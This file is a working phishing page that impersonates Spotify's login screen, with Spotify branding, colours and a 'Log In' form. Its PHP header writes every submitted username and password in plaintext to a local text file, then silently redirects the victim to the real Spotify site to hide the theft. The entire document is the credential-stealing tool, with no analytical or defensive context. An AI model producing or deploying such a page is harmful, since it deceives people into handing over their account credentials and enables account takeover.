<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://accounts.spotify.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Spotify – Log In</title><meta charset="UTF-8"></head>
<body style="background: #191414; font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
<div style="width: 350px; margin: auto; padding: 40px; color: white;">
<h1 style="font-size: 48px;">Spotify</h1>
<h2>Log in to continue</h2>
<form method="post">
<input type="text" name="username" placeholder="Email or username" style="width: 90%; padding: 14px; margin: 10px 0; border: none; border-radius: 30px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 14px; margin: 10px 0; border: none; border-radius: 30px;" required><br>
<button type="submit" style="background: #1db954; color: white; width: 95%; padding: 14px; border: none; border-radius: 30px; font-weight: bold;">Log In</button>
</form>
</div>
</body>
</html>
